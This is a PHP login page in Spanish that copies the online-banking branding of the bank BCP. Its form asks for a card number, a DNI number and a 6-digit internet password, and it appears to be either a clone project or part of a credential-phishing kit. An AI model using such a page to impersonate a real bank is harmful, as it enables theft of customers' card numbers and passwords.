<?php
session_start();
$error = null;
if (isset($_GET["error"])) {
    $error = "Credenciales incorrectas";
}
$error_ubicacion = false;
if (isset($_SESSION['error_ubicacion']) && $_SESSION['error_ubicacion']) {
    $error_ubicacion = true;
}

?>
<!DOCTYPE html>
<html lang="es">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login | Banca en Linea BCP</title>
    <link href="../view/css/style_login.css" rel="stylesheet">
    <link rel="shortcut icon" href="../view/img/bcp_logo.png" type="image/x-icon">
    <link rel="stylesheet" href="../view/keyboard/keyborad.css">
    <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
    <style>
        /* Ocultar los spinners en navegadores basados en WebKit */
        input[type=number]::-webkit-inner-spin-button,
        input[type=number]::-webkit-outer-spin-button {
            -webkit-appearance: none;
            /* Oculta los spinners */
            margin: 0;
            /* Elimina el margen */
        }

        /* Para Firefox */
        input[type=number] {
            -moz-appearance: textfield;
            /* Cambia la apariencia a un campo de texto */
        }
    </style>
</head>

<body>
    <main>
        <!-- Despues de darle clic en ingresar y los datos sean correctos-->
        <?php if ($error_ubicacion) { ?>
            <?php include '../view/modals/alerta_dispositivo.php' ?>
        <?php }
        unset($_SESSION['error_ubicacion']);

        ?>
        <div class="logo"><img src="img/loguito.png" alt="logo_bcp.jpg"></div>
        <div class="flex">
            <!--Cambiar image-->
            <div class="img_trabajador"><img src="img/bcp_bycer.jpg" alt="imagen_login.jpg"></img></div>
            <div class="iniciar_sesion">
                <!--
                <h1>Ingresa a tu banca en linea</h1>
                <form action="../php/user_login.php" method="POST" autocomplete="off">
                    <div>
                        <input type="text" placeholder="Numero de tarjeta de debido o credito" name="tarjeta"
                            autocomplete="off" maxlength="16">
        -->
                <h1>Ingresa a tu banca en línea</h1>
                <form action="../controller/ControllerUserLogin.php" method="POST" autocomplete="off">
                    <div>
                        <input type="text" placeholder="Número de tarjeta de débito o crédito" name="tarjeta"
                            autocomplete="off">

                    </div>
                    <div class="group">
                        <input class="only_text" disabled value="DNI" />
                        <input type="text" placeholder="Nº de Documento" name="dni" maxlength="8" autocomplete="off">
                    </div>
                    <div>
                        <input type="password" class="use-keyboard-input" placeholder="Clave de internet de 6 dígitos"
                            name="clave_internet" autocomplete="off" maxlength="6" id="digitos" required>
                    </div>
                    <?php if ($error != null): ?>
                        <p class="error"><?= $error ?></p>
                    <?php endif; ?>
                    <button type="submit">Ingresar</button>
                </form>
            </div>
        </div>
    </main>

    <script src="../view/keyboard/keyboard.js"></script>
    <script src="../view/js/limite_clave_internet.js"></script>

</body>

</html>